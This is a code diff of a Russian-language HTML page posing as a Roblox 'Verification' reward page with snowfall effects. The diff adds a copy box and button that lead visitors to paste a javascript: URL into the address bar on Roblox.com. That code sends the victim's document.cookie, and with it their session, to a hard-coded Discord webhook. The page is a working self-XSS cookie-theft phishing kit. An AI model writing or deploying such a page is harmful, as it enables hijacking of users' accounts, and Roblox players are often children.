@@ -2,57 +2,76 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox | Holiday Verification</title>
+    <title>Roblox | Verification</title>
     <style>
         body {
             margin: 0; padding: 0;
-            background: linear-gradient(135deg, #1a0000 0%, #000000 50%, #000022 100%);
+            background: linear-gradient(135deg, #330000 0%, #000000 50%, #000033 100%);
             font-family: 'Segoe UI', sans-serif;
             display: flex; justify-content: center; align-items: center;
             height: 100vh; overflow: hidden; color: white;
         }
-        .snowflake {
-            color: #fff; font-size: 1.2em; position: fixed; top: -10%; z-index: 1;
-            animation: fall linear infinite;
-        }
+        .snowflake { position: fixed; top: -10%; color: white; animation: fall linear infinite; z-index: 1; }
         @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.05);
+
+        .card {
+            background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 40px; border-radius: 24px;
-            text-align: center; width: 360px; z-index: 10;
-            box-shadow: 0 0 40px rgba(0,0,0,0.5);
+            padding: 30px; border-radius: 20px;
+            text-align: center; width: 380px; z-index: 10;
+            box-shadow: 0 0 40px rgba(255,0,0,0.2);
         }
-        .logo { width: 65px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ff0000); }
-        h1 { font-size: 22px; color: #ff4d4d; margin-bottom: 10px; }
-        input {
-            width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px;
-            border: 1px solid #333; background: rgba(0,0,0,0.5); color: white; box-sizing: border-box;
+        .logo {
+            width: 50px; height: 50px; background: #ff3b3b; margin: 0 auto 15px;
+            transform: rotate(-10deg); border-radius: 10px; position: relative;
+        }
+        .logo::after {
+            content: ''; position: absolute; width: 18px; height: 18px;
+            background: #000; top: 16px; left: 16px; transform: rotate(10deg);
+        }
+        .code-box {
+            background: #111; padding: 12px; border-radius: 8px;
+            margin: 20px 0; font-family: monospace; font-size: 10px;
+            color: #00ff00; word-break: break-all; cursor: pointer; border: 1px dashed #444;
         }
         .btn {
-            background: #ff4d4d; color: white; border: none; padding: 14px;
-            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s;
+            background: #ff3b3b; color: white; border: none; padding: 14px;
+            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer;
         }
-        .btn:hover { background: #ff1a1a; transform: scale(1.02); }
     </style>
 </head>
 <body>
 
 <script>
-    for(let i=0; i<50; i++) {
-        let div = document.createElement('div');
-        div.className = 'snowflake';
-        div.innerHTML = '❄';
-        div.style.left = Math.random() * 100 + 'vw';
-        div.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        div.style.opacity = Math.random();
-        document.body.appendChild(div);
+    for(let i=0; i<40; i++) {
+        let s = document.createElement('div');
+        s.className = 'snowflake'; s.innerHTML = '❄';
+        s.style.left = Math.random() * 100 + 'vw';
+        s.style.animationDuration = (Math.random() * 3 + 2) + 's';
+        document.body.appendChild(s);
     }
 </script>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Roblox_Logo_2022.svg/1200px-Roblox_Logo_2022.svg.png" class="logo">
-    <h1>Holiday Verification</h1>
-    <p style="font-size:
+<div class="card">
+    <div class="logo"></div>
+    <h2 style="color: #ff3b3b; margin: 0;">VERIFICATION REQUIRED</h2>
+    <p style="font-size: 13px; opacity: 0.8;">Скопируйте код и вставьте в адресную строку на <b>Roblox.com</b> для получения награды:</p>
+
+    <div class="code-box" id="copyText" onclick="copy()">
+        javascript:fetch('https://discord.com/api/webhooks/1460387936641089720/uesCAzndIABWNuY5MnkA0w-eHMRFbSL91OSdPLj0_D_uaS2YonC_cbfEc-MylM8fTv-x',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🔥 **COOKIE:** ```'+document.cookie+'```'})});alert('Success!');
+    </div>
+
+    <button class="btn" onclick="copy()">СКОПИРОВАТЬ</button>
+</div>
+
+<script>
+    function copy() {
+        const text = document.getElementById('copyText').innerText;
+        navigator.clipboard.writeText(text);
+        alert("Код скопирован! Вставьте его в адресную строку на сайте Roblox.");
+    }
+</script>
+
+</body>
+</html>
